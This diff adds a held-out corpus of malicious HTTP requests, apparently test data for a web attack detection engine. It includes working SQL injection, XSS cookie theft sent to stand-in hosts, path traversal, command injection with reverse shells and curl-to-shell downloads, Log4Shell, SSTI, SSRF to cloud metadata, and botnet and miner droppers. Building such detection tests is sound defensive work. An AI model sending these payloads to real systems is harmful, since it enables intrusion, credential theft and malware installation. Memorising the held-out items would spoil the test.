@@ -1,0 +1,515 @@
+# Held out: written by a separate agent that never saw the engine (2026-11-10), so it measures
+# how the engine does on attacks it was not tuned for. Same format as ../attacks.tsv.
+# bw-holdout attack corpus — realistic malicious HTTP requests
+# format: category<TAB>target[<TAB>M=METHOD][<TAB>H:Header=value]
+# ~ prefix = weak/ambiguous signal (flag, don't necessarily block)
+# attacker hosts use documentation ranges + example.com/evil.example
+#
+# ============ SQL INJECTION ============
+sqli	/products?id=1'	M=GET
+sqli	/products?id=1%27	M=GET
+sqli	/item.php?id=1' OR '1'='1
+sqli	/item.php?id=1%27%20OR%20%271%27%3D%271
+sqli	/login?user=admin'--	M=POST
+sqli	/login?user=admin'%23
+sqli	/view?id=1' OR 1=1--+-
+sqli	/view?id=1) OR (1=1--
+sqli	/search?q=1' UNION SELECT NULL,NULL,NULL--
+sqli	/search?q=1'/**/UNION/**/SELECT/**/1,2,3--
+sqli	/search?q=1'+UnIoN+SeLeCt+username,password+FROM+users--
+sqli	/news?id=-1 UNION SELECT 1,concat(user,0x3a,password),3 FROM mysql.user
+sqli	/news?id=1 AND 1=CONVERT(int,(SELECT @@version))
+sqli	/news?id=1' AND 1=CAST((SELECT version()) AS int)--
+sqli	/p?id=1';WAITFOR DELAY '0:0:5'--
+sqli	/p?id=1' AND SLEEP(5)--
+sqli	/p?id=1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+sqli	/p?id=1' AND pg_sleep(5)--
+sqli	/p?id=1' AND 1=(SELECT 1 FROM pg_sleep(5))--
+sqli	/p?id=1 AND BENCHMARK(5000000,MD5(1))
+sqli	/p?id=1' AND ExtractValue(1,concat(0x7e,(SELECT version())))--
+sqli	/p?id=1' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
+sqli	/p?id=1' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+sqli	/p?id=1' AND 1=0 UNION ALL SELECT table_name,2 FROM information_schema.tables--
+sqli	/p?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
+sqli	/p?id=1' AND ASCII(SUBSTR((SELECT database()),1,1))%3E64--
+sqli	/p?id=1'||(SELECT utl_inaddr.get_host_address FROM dual)||'
+sqli	/p?id=1' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
+sqli	/p?id=1' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(62)||CHR(62),5)=1--
+sqli	/p?id=1'; DROP TABLE users;--
+sqli	/p?id=1'; EXEC xp_cmdshell('whoami')--
+sqli	/p?id=1'; INSERT INTO users(user,pass) VALUES('h','h')--
+sqli	/p?id=1' AND 1=1 LIMIT 1 INTO OUTFILE '/var/www/html/s.php'--
+sqli	/p?id=1' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,version())),1)--
+sqli	/api/v1/users?sort=id);SELECT PG_SLEEP(5)--
+sqli	/order?col=name,(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)
+sqli	/filter?price=1 AND 1=1&cat=2
+sqli	/p?id=0x31%27%20OR%20%271
+sqli	/p?id=%2527%2520OR%25201%253D1--
+sqli	/p?id=1%u0027%20OR%201=1
+sqli	/p?id=1%EF%BC%87%20OR%201=1--
+sqli	/login	M=POST	H:Content-Type=application/x-www-form-urlencoded
+sqli	/graphql?query={user(id:"1' OR '1'='1")}
+sqli	/rest/products/search?q=')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--
+sqli	/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit
+sqli	/cgi?id=1'	H:User-Agent=sqlmap/1.8.3#stable (https://sqlmap.org)
+sqli	/cgi?id=1'	H:X-Forwarded-For=1' OR '1'='1
+sqli	/account?id=1'	H:Referer=1' AND SLEEP(5)--
+sqli	/wp-admin/admin-ajax.php?action=x&id=1' OR SLEEP(3)--	M=POST
+#
+# ============ NoSQL INJECTION ============
+sqli	/login?user[$ne]=1&pass[$ne]=1
+sqli	/login?user[$gt]=&pass[$gt]=
+sqli	/api/users?filter={"$where":"sleep(5000)"}
+sqli	/api/users?id[$regex]=.*
+sqli	/login	M=POST	H:Content-Type=application/json
+sqli	/search?q={"username":{"$ne":null},"password":{"$ne":null}}
+sqli	/api?id[$in][]=admin
+sqli	/users?age[$gt]=0';return true;var x='
+#
+# ============ XSS ============
+xss	/search?q=<script>alert(1)</script>
+xss	/search?q=%3Cscript%3Ealert(1)%3C/script%3E
+xss	/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+xss	/search?q=<img src=x onerror=alert(1)>
+xss	/search?q=<svg/onload=alert(1)>
+xss	/search?q=<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+xss	/search?q="><img src=x onerror=alert(document.domain)>
+xss	/search?q='><script>alert(String.fromCharCode(88,83,83))</script>
+xss	/search?q=<body onload=alert(1)>
+xss	/search?q=<iframe src=javascript:alert(1)>
+xss	/search?q=<a href="javascript:alert(1)">x</a>
+xss	/search?q=javascript:alert(document.cookie)
+xss	/search?q=<input autofocus onfocus=alert(1)>
+xss	/search?q=<details open ontoggle=alert(1)>
+xss	/search?q=<marquee onstart=alert(1)>
+xss	/search?q=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E
+xss	/search?q=<ScRiPt>alert(1)</ScRiPt>
+xss	/search?q=<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+xss	/search?q=<svg><script>alert%26%2340%3B1%26%2341%3B</script>
+xss	/search?q=<x onclick=alert(1)>click
+xss	/search?q=\u003cscript\u003ealert(1)\u003c/script\u003e
+xss	/search?q=<img src=`x`onerror=alert(1)>
+xss	/search?q=<script>fetch('//evil.example/c?'+document.cookie)</script>
+xss	/search?q=<script src=//evil.example/x.js></script>
+xss	/comment?text=<script>new Image().src='//198.51.100.7/?c='+document.cookie</script>	M=POST
+xss	/page?name=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+xss	/redirect?url=javascript:alert(1)
+xss	/profile?bio=<iframe srcdoc="<script>alert(1)</script>">
+xss	/x?q=<template><script>alert(1)</script></template>
+xss	/x?q=<math><mtext><script>alert(1)</script>
+xss	/x?q=<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+xss	/x?q=<style>@import'//evil.example/x.css';</style>
+xss	/dom?hash=1%23<img src=x onerror=alert(1)>
+xss	/search?q=onmouseover%3Dalert%281%29
+xss	/search?q=<object data=javascript:alert(1)>
+xss	/search?q=<embed src=//evil.example/x.swf>
+xss	/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E
+xss	/login?next=data:text/html,<script>alert(1)</script>
+xss	/x?q=<svg><use href="data:image/svg+xml,<svg id='x' onload='alert(1)'></svg>%23x"/>
+xss	/feedback	M=POST	H:User-Agent=<script>alert(1)</script>
+xss	/x?q=test	H:Referer=https://evil.example/"><script>alert(1)</script>
+#
+# ============ PATH TRAVERSAL / LFI / RFI ============
+traversal	/download?file=../../../../etc/passwd
+traversal	/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd
+traversal	/download?file=..%252f..%252f..%252fetc%252fpasswd
+traversal	/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+traversal	/download?file=....//....//....//etc/passwd
+traversal	/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+traversal	/download?file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+traversal	/download?file=..%u2215..%u2215etc%u2215passwd
+traversal	/view?page=../../../../../../etc/shadow
+traversal	/view?page=/etc/passwd%00.png
+traversal	/view?page=....\\....\\....\\windows\\win.ini
+traversal	/view?page=..%5c..%5c..%5cwindows%5cwin.ini
+traversal	/view?page=C:\boot.ini
+traversal	/view?page=/proc/self/environ
+traversal	/view?page=/var/log/apache2/access.log
+traversal	/include?f=php://filter/convert.base64-encode/resource=index.php
+traversal	/include?f=php://filter/read=string.rot13/resource=config.php
+traversal	/include?f=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+traversal	/include?f=expect://id
+traversal	/include?f=zip://shell.jpg%23payload.php
+traversal	/include?page=http://evil.example/shell.txt
+traversal	/include?page=https://198.51.100.9/c99.txt%00
+traversal	/include?page=\\\\198.51.100.9\\share\\shell.php
+traversal	/static?path=file:///etc/passwd
+traversal	/img?src=..././..././..././etc/passwd
+traversal	/api/files?name=%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
+traversal	/download?file=....////....////....////etc/hostname
+traversal	/r?p=..%bg%qf..%bg%qf..%bg%qfetc%bg%qfpasswd
+traversal	/doc?lang=en&file=../../../../etc/passwd%00
+#
+# ============ OS COMMAND INJECTION ============
+rce	/ping?host=127.0.0.1;id
+rce	/ping?host=127.0.0.1%3Bid
+rce	/ping?host=127.0.0.1|id
+rce	/ping?host=127.0.0.1%7Cid
+rce	/ping?host=127.0.0.1%26%26id
+rce	/ping?host=127.0.0.1`id`
+rce	/ping?host=127.0.0.1$(id)
+rce	/ping?host=127.0.0.1%0aid
+rce	/ping?host=$(curl${IFS}evil.example/s|bash)
+rce	/ping?host=127.0.0.1;cat${IFS}/etc/passwd
+rce	/ping?host=;c''a''t${IFS}/etc/pas''swd
+rce	/ping?host=127.0.0.1;wget http://198.51.100.9/x -O /tmp/x
+rce	/ping?host=127.0.0.1;nc 203.0.113.5 4444 -e /bin/sh
+rce	/exec?cmd=whoami
+rce	/exec?cmd=cat /etc/passwd
+rce	/exec?cmd=%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
+rce	/api/run?cmd=ping -c 1 evil.example;rm -rf /
+rce	/win?host=127.0.0.1&c=1%26ping%20-n%204%20127.0.0.1
+rce	/win?c=cmd.exe /c whoami
+rce	/win?c=powershell -enc JABjAD0AJwBpAGQAJwA=
+rce	/win?c=127.0.0.1%26type%20C:\\windows\\win.ini
+rce	/debug?eval=__import__('os').popen('id').read()
+rce	/debug?eval=require('child_process').execSync('id')
+rce	/jolokia/exec/java.lang:type=Runtime/exec/id
+rce	/api?data=;bash -i >%26 /dev/tcp/203.0.113.5/4444 0>%261
+rce	/cgi-bin/test.cgi?a=|/bin/sh
+rce	/x?host=127.0.0.1%0A%0Dcat /etc/passwd
+rce	/upload	M=POST	H:User-Agent=() { :;}; /bin/bash -c "id"
+rce	/cgi-bin/status	H:User-Agent=() { :; }; echo; /bin/cat /etc/passwd
+rce	/cgi-bin/poc.cgi	H:Cookie=() { :;}; /usr/bin/id
+#
+# ============ SSTI ============
+ssti	/hello?name={{7*7}}
+ssti	/hello?name=%7B%7B7*7%7D%7D
+ssti	/hello?name=${7*7}
+ssti	/hello?name=%23{7*7}
+ssti	/hello?name=<%= 7*7 %>
+ssti	/hello?name={{7*'7'}}
+ssti	/hello?name={{config}}
+ssti	/hello?name={{config.items()}}
+ssti	/hello?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+ssti	/hello?name={{''.__class__.__mro__[1].__subclasses__()}}
+ssti	/hello?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+ssti	/hello?name={{cycler.__init__.__globals__.os.popen('id').read()}}
+ssti	/hello?name={{lipsum.__globals__['os'].popen('id').read()}}
+ssti	/hello?name={%25 for x in ().__class__.__base__.__subclasses__() %25}{{x}}{%25 endfor %25}
+ssti	/hello?name=${T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	/hello?name=${{<%25[%25'"}}%25\
+ssti	/hello?name=@(1+2)
+ssti	/hello?name=%23set($x='')$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
+ssti	/hello?name=<%25=Runtime.getRuntime().exec("id")%25>
+ssti	/hello?name=*{T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	/hello?name=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__
+ssti	/hello?name={{['id']|filter('system')}}
+ssti	/hello?name={php}system('id'){/php}
+ssti	/hello?name=<%23assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+ssti	/render?tpl=%23{ 7 * 7 }
+ssti	/mail?subject=${product.getClass().forName('java.lang.Runtime')}
+#
+# ============ SSRF ============
+ssrf	/fetch?url=http://169.254.169.254/latest/meta-data/
+ssrf	/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+ssrf	/fetch?url=http://169.254.169.254/latest/user-data
+ssrf	/fetch?url=http://[fd00:ec2::254]/latest/meta-data/
+ssrf	/fetch?url=http://metadata.google.internal/computeMetadata/v1/	H:Metadata-Flavor=Google
+ssrf	/fetch?url=http://100.100.100.200/latest/meta-data/
+ssrf	/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01	H:Metadata=true
+ssrf	/fetch?url=http://127.0.0.1:6379/
+ssrf	/fetch?url=http://localhost:8080/admin
+ssrf	/fetch?url=http://0.0.0.0:22/
+ssrf	/fetch?url=http://0177.0.0.1/
+ssrf	/fetch?url=http://2130706433/
+ssrf	/fetch?url=http://0x7f000001/
+ssrf	/fetch?url=http://127.1/
+ssrf	/fetch?url=http://[::1]/
+ssrf	/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]/
+ssrf	/fetch?url=http://169.254.169.254.nip.io/
+ssrf	/fetch?url=http://evil.example%2523@169.254.169.254/
+ssrf	/fetch?url=gopher://127.0.0.1:6379/_SET%2520k%2520v
+ssrf	/fetch?url=dict://127.0.0.1:11211/stats
+ssrf	/fetch?url=file:///etc/passwd
+ssrf	/webhook?callback=http://192.0.2.10:9000/internal
+ssrf	/proxy?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/role	H:X-Forwarded-For=127.0.0.1
+ssrf	/api/preview	M=POST	H:Content-Type=application/json
+#
+# ============ XXE ============
+xxe	/xml	M=POST	H:Content-Type=application/xml
+xxe	/api/import	M=POST	H:Content-Type=text/xml
+xxe	/soap	M=POST	H:SOAPAction=urn:x
+xxe	/svg/upload	M=POST	H:Content-Type=image/svg+xml
+xxe	/wp-json/oembed/1.0/embed?url=x&format=xml
+xxe	/xmlrpc.php	M=POST	H:Content-Type=text/xml
+xxe	/feed?type=xml&data=<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
+xxe	/parse	M=POST	H:Content-Type=application/xml	H:User-Agent=curl/8.5.0
+xxe	/docx/convert	M=POST	H:Content-Type=application/octet-stream
+xxe	/saml/acs	M=POST	H:Content-Type=application/x-www-form-urlencoded
+#
+# ============ LOG4SHELL / JNDI ============
+log4shell	/?x=${jndi:ldap://evil.example/a}
+log4shell	/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D
+log4shell	/search?q=${jndi:rmi://198.51.100.9:1099/x}
+log4shell	/login	H:User-Agent=${jndi:ldap://203.0.113.5:389/Basic/Command/Base64/aWQ=}
+log4shell	/login	H:X-Api-Version=${jndi:ldap://evil.example/a}
+log4shell	/login	H:Referer=${jndi:dns://evil.example}
+log4shell	/login	H:X-Forwarded-For=${jndi:ldap://evil.example/a}
+log4shell	/?x=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.example/a}
+log4shell	/?x=${${lower:j}ndi:${lower:l}dap://evil.example/a}
+log4shell	/?x=${jndi:${lower:l}${lower:d}a${lower:p}://evil.example/a}
+log4shell	/?x=${jndi:ldap://${env:USER}.evil.example/a}
+log4shell	/?x=${jndi:ldap://${sys:java.version}.evil.example/a}
+log4shell	/api	M=POST	H:X-Auth=${jndi:ldaps://evil.example:1636/a}
+log4shell	/api	H:Cookie=session=${jndi:ldap://evil.example/a}
+log4shell	/?x=${jndi:nis://evil.example/a}
+#
+# ============ DESERIALIZATION ============
+deser	/invoke	M=POST	H:Content-Type=application/x-java-serialized-object
+deser	/api/readObject	M=POST	H:Content-Type=application/octet-stream
+deser	/wls-wsat/CoordinatorPortType	M=POST	H:Content-Type=text/xml
+deser	/struts2/x.action?redirect:${%23a=new java.lang.ProcessBuilder}
+deser	/x.action	M=POST	H:Content-Type=%{(#_='multipart/form-data').(#cmd='id')}
+deser	/__session?data=O:8:"stdClass":1:{s:1:"x";s:2:"id";}
+deser	/api?__VIEWSTATE=rO0ABXNyAA	M=POST
+deser	/node?payload=_$$ND_FUNC$$_function(){require('child_process').exec('id')}()
+deser	/pickle	M=POST	H:Content-Type=application/python-pickle
+deser	/ysoserial	M=POST	H:Content-Type=application/x-java-serialized-object	H:User-Agent=Java/1.8.0
+#
+# ============ SECRET / CONFIG HUNTING ============
+secrets	/.env
+secrets	/.env.local
+secrets	/.env.production
+secrets	/.env.backup
+secrets	/api/.env
+secrets	/.git/config
+secrets	/.git/HEAD
+secrets	/.git/logs/HEAD
+secrets	/.gitignore
+secrets	/.svn/entries
+secrets	/.hg/store
+secrets	/.aws/credentials
+secrets	/.aws/config
+secrets	/.ssh/id_rsa
+secrets	/.ssh/authorized_keys
+secrets	/.npmrc
+secrets	/.dockercfg
+secrets	/.docker/config.json
+secrets	/config.php.bak
+secrets	/wp-config.php.bak
+secrets	/wp-config.php~
+secrets	/config.yml
+secrets	/config/database.yml
+secrets	/application.properties
+secrets	/application.yml
+secrets	/appsettings.json
+secrets	/web.config
+secrets	/.htpasswd
+secrets	/.htaccess
+secrets	/backup.sql
+secrets	/db.sql
+secrets	/dump.sql
+secrets	/database.sql.gz
+secrets	/backup.zip
+secrets	/backup.tar.gz
+secrets	/www.zip
+secrets	/site.tar.gz
+secrets	/.DS_Store
+secrets	/phpinfo.php
+secrets	/info.php
+secrets	/server-status
+secrets	/.vscode/sftp.json
+secrets	/.idea/workspace.xml
+secrets	/.github/workflows/deploy.yml
+secrets	/.gitlab-ci.yml
+secrets	/.circleci/config.yml
+secrets	/.travis.yml
+secrets	/Dockerfile
+secrets	/docker-compose.yml
+secrets	/.terraform/terraform.tfstate
+secrets	/terraform.tfstate
+secrets	/credentials.json
+secrets	/service-account.json
+secrets	/.netrc
+secrets	/id_rsa
+secrets	/.bash_history
+secrets	/.mysql_history
+secrets	/secrets.yaml
+secrets	/.kube/config
+secrets	/.continue/config.json
+secrets	/.aider.conf.yml
+secrets	/.cursor/mcp.json
+secrets	/.claude/settings.json
+secrets	/.mcp.json
+secrets	/firebase.json
+secrets	/.firebaserc
+secrets	/sftp-config.json
+secrets	/.env.example
+#
+# ============ WEB SHELLS ============
+webshell	/shell.php?cmd=id
+webshell	/c99.php
+webshell	/r57.php
+webshell	/wso.php
+webshell	/b374k.php
+webshell	/cmd.jsp?cmd=whoami
+webshell	/shell.jsp?c=id
+webshell	/cmd.aspx?cmd=whoami
+webshell	/alfa.php
+webshell	/0byt3m1n1.php
+webshell	/uploads/shell.phtml?0=id
+webshell	/images/x.php?c=system('id')
+webshell	/tmp/up.php?a=whoami
+webshell	/adminer.php
+webshell	/.well-known/pki-validation/shell.php
+#
+# ============ KNOWN CVE EXPLOIT PATHS ============
+cve	/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh	M=POST
+cve	/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+cve	/vpns/cfg/smb.conf
+cve	/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd
+cve	/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+cve	/+CSCOE+/logon.html
+cve	/global-protect/login.esp
+cve	/api/v2/cmdb/system/admin/../../../../bin/sh
+cve	/solr/admin/cores?action=CREATE&name=x&configSet=../../../../etc
+cve	/struts2-showcase/${(1+1)}/actionChain1.action
+cve	/_async/AsyncResponseService	M=POST	H:Content-Type=text/xml
+cve	/console/css/%252e%252e%252fconsole.portal
+cve	/manager/html	H:Authorization=Basic dG9tY2F0OnRvbWNhdA==
+cve	/actuator/env
+cve	/actuator/gateway/routes	M=POST	H:Content-Type=application/json
+cve	/actuator/heapdump
+cve	/api/jsonws/invoke
+cve	/wp-json/wp/v2/users/
+cve	/wp-content/plugins/revslider/temp/update_extract/revslider/shell.php
+cve	/wp-admin/admin-ajax.php?action=duplicator_download&file=/../wp-config.php
+cve	/?rest_route=/wp/v2/users
+cve	/index.php?s=/index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+cve	/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php	M=POST
+cve	/boaform/admin/formLogin?username=ec8&psd=ec8
+cve	/HNAP1/	M=POST	H:SOAPAction="http://purenetworks.com/HNAP1/GetDeviceSettings/`id`"
+cve	/GponForm/diag_Form?images/	M=POST
+cve	/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=id
+cve	/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)
+cve	/owa/auth/x.js	H:Cookie=X-AnonResource-Backend=localhost/ecp/x~1941962753
+cve	/autodiscover/autodiscover.json?@evil.example/owa/	M=POST
+cve	/nice ports,/Trinity.txt.bak
+cve	/mifs/.;/services/LogService
+cve	/jenkins/script
+cve	/spring-cloud-config/x	H:Content-Type=application/json
+cve	/druid/index.html
+cve	/.git/../config.php
+cve	/api/v1/totp/user-backup-code/../../user/x	M=PUT
+cve	/webtools/control/main/ProgramExport	M=POST
+cve	/seeyon/htmlofficeservlet	M=POST
+cve	/nacos/v1/auth/users?username=x&password=x	M=POST	H:User-Agent=Nacos-Server
+#
+# ============ IoT / ROUTERS / CAMERAS ============
+iot	/system.ini?loginuse&loginpas
+iot	/onvif/device_service	M=POST	H:Content-Type=application/soap+xml
+iot	/web/cgi-bin/hi3510/param.cgi?cmd=setptz
+iot	/cgi-bin/nobody/Machine.cgi?action=get_capability
+iot	/cgi-bin/supervisor/CloudSetup.cgi?exefile=id
+iot	/goform/webLogin	M=POST
+iot	/goform/setUsbUnload?deviceName=1;id
+iot	/tmUnblock.cgi	M=POST
+iot	/cgi-bin/;id
+iot	/shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.9/Mozi.m;chmod+777+Mozi.m;./Mozi.m
+iot	/picsdesc.xml	M=POST
+iot	/wanipcn.xml	M=POST
+iot	/UD/act?1	M=POST
+iot	/ctrlt/DeviceUpgrade_1	M=POST
+iot	/cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0a/bin/sh${IFS}-c${IFS}'id'%0a%27
+iot	/vb.htm?x=;$(busybox+wget+http://203.0.113.5/x)
+iot	/dvr/cmd	M=POST	H:User-Agent=Hello, world
+iot	/stalker_portal/c/version.js
+iot	/boaform/admin/formTracert?target=;telnetd
+iot	/login.cgi?cli=aa aa%27;wget http://198.51.100.9/m -O /tmp/m%27
+#
+# ============ CRYPTOMINERS / BOTNET DROPPERS ============
+miner	/?XDEBUG_SESSION_START=phpstorm	M=GET	H:User-Agent=Mozilla/5.0 zgrab/0.x
+miner	/x?cmd=cd /tmp;wget http://198.51.100.9/xmrig;chmod +x xmrig;./xmrig
+miner	/api/download?url=http://evil.example/kinsing	M=POST
+miner	/wp-content/uploads/xmr.sh
+miner	/.well-known/acme-challenge/;curl -s 203.0.113.5/i.sh|sh
+miner	/solr/admin/collections?action=x	H:User-Agent=python-requests/2.x
+miner	/vendor/.cache/xmrig.json
+miner	/mining/pool/config.json
+#
+# ============ OPEN REDIRECT ============
+~redirect	/login?next=https://evil.example
+~redirect	/redirect?url=//evil.example
+~redirect	/out?to=https:%2f%2fevil.example
+~redirect	/go?u=https://evil.example%2f%2e%2e
+~redirect	/r?url=/%09/evil.example
+~redirect	/r?url=https:/evil.example
+~redirect	/r?url=https://trusted.example.evil.example
+~redirect	/r?url=https://trusted.example@evil.example
+~redirect	/r?url=%68%74%74%70%3a%2f%2fevil.example
+~redirect	/auth?redirect_uri=http://evil.example/cb
+~redirect	/logout?returnTo=//198.51.100.9
+~redirect	/sso?RelayState=https://evil.example
+#
+# ============ CRLF / HEADER INJECTION ============
+protocol	/x?q=a%0d%0aSet-Cookie:%20sid=evil
+protocol	/x?q=a%0d%0aLocation:%20https://evil.example
+protocol	/redirect?url=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK
+protocol	/x?name=test%0d%0aX-Injected:%20true
+protocol	/x?q=a%E5%98%8A%E5%98%8DSet-Cookie:x=1
+protocol	/api	H:X-Forwarded-Host=evil.example
+protocol	/api	H:Host=evil.example
+protocol	/api	H:X-Forwarded-For=127.0.0.1, 169.254.169.254
+protocol	/x	H:Transfer-Encoding=chunked	M=POST
+protocol	/x	H:Content-Length=0	H:Transfer-Encoding= chunked	M=POST
+~protocol	/	M=TRACE
+~protocol	/	M=TRACK
+protocol	/x?q=1	H:Range=bytes=0-18446744073709551615
+protocol	/%2e%2e%2f%2e%2e%2fadmin	M=GET
+protocol	/admin%00/
+protocol	/x	H:X-Original-URL=/admin
+#
+# ============ LDAP / XPATH INJECTION ============
+sqli	/dir?user=*)(uid=*))(|(uid=*
+sqli	/dir?user=admin)(|(password=*))
+sqli	/login?user=*)(objectClass=*)
+sqli	/xpath?q=' or '1'='1
+sqli	/xpath?q=count(/*)
+sqli	/xpath?name=']|//user[position()=1]|//*['
+#
+# ============ PROTOTYPE POLLUTION ============
+rce	/api/merge?__proto__[polluted]=yes	M=POST
+rce	/api/set?constructor[prototype][x]=1	M=POST
+rce	/x?__proto__.polluted=1
+rce	/x?a[__proto__][isAdmin]=true
+rce	/api/config	M=POST	H:Content-Type=application/json
+#
+# ============ RECON / SCANNERS (weak signals + tool UAs) ============
+~recon	/robots.txt	H:User-Agent=Mozilla/5.0 (compatible; Nmap Scripting Engine)
+~recon	/	H:User-Agent=Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
+~recon	/	H:User-Agent=Mozilla/5.0 (compatible; Nikto/2.5.0)
+~recon	/	H:User-Agent=masscan/1.3
+~recon	/	H:User-Agent=WPScan v3.8
+~recon	/	H:User-Agent=Mozilla/5.0 (X11; Linux) gobuster/3.6
+~recon	/	H:User-Agent=feroxbuster/2.10
+~recon	/	H:User-Agent=dirbuster
+~recon	/	H:User-Agent=Fuzz Faster U Fool v2.1.0-dev
+~recon	/	H:User-Agent=Nessus
+~recon	/admin
+~recon	/administrator/
+~recon	/phpmyadmin/
+~recon	/.well-known/security.txt
+~recon	/wp-login.php
+~recon	/xmlrpc.php
+~recon	/server-info
+~recon	/.well-known/openid-configuration
+recon	/?a=fetch&content=<php>die(@md5(HelloThinkPHP))</php>
+recon	/x	H:User-Agent=${jndi:ldap://evil.example/a}
+#
+# ============ MISC INFRA / CLOUD ============
+infra	/metrics	H:User-Agent=Prometheus
+~infra	/debug/pprof/
+infra	/v2/_catalog
+infra	/api/v1/namespaces/default/pods
+~infra	/.well-known/ai-plugin.json
+infra	/latest/meta-data/
+infra	/healthz/../../etc/passwd
+infra	/graphql	M=POST	H:Content-Type=application/json
+~infra	/graphql?query={__schema{types{name}}}
+infra	/_cat/indices
+infra	/_search?q=*:*
+infra	/.well-known/caldav	M=PROPFIND
+infra	/console	H:Authorization=Basic YWRtaW46YWRtaW4=
+infra	/api/v4/projects?private_token=example-token-xxxxxxxxxxxx
+infra	/.env	H:User-Agent=python-requests/2.31.0
